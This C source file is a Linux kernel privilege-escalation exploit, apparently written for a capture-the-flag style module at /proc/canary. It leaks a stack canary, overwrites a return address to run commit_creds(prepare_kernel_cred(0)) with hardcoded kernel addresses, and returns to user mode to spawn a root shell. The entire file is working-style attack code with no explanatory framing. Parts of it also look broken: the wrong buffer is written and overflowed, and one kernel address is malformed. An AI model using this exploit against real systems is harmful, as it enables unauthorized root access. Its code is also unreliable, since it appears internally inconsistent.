#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>

struct trap_frame{
        void *rip;
        uint64_t cs;
        uint64_t rflags;
        void *rsp;
        uint64_t ss;
};
struct trap_frame tf;

void launch_shell() {
        getuid();
        system("/bin/sh");
}

void prepare_tf(){
        asm(    "movq %%cs, %0\n"
                "movq %%ss, %1\n"
                "movq %%rsp, %3\n"
                "pushfq\n"
                "popq %2\n"
                : "=r"(tf.cs), "=r"(tf.ss), "=r"(tf.rflags), "=r"(tf.rsp) :: "memory"
        );
        tf.rip = &launch_shell;
        tf.rsp -= 1024;
}

#define KERNCALL __attribute__((regparm(3)))
void (*commit_creds)(void *) KERNCALL = (void *)0xffffffffb9e7e9c;
void *(*prepare_kernel_cred)(void *) KERNCALL = (void *)0xffffffffb9e7ed20;

void payload(void){
        commit_creds(prepare_kernel_cred(0));
        asm(    "swapgs\n"
                "mov $tf,%rsp\n"
                "iretq\n"
        );
}

int main(){
        char buf[5]="a";
	char out[100];
	char canary[8];
        int fd=open("/proc/canary",O_RDWR);
        write(fd,buf,5);
	read(fd,out,40);
	int i;
	int j = 0;
	for(i = 16; i < 24; i++) {
		canary[j] = out[i];
		j++;
	}
	char buffer[40]={0};
	memset(buffer,'B',40);
	*(void **)(buf + 24) = &payload;
        prepare_tf();
	
	for(i=0; i < 8; i++) {
		buffer[3+i] = canary[i];	
	}
	int fd2=open("/proc/canary",O_RDWR);
        write(fd2,buf,40);
        return 0;
}
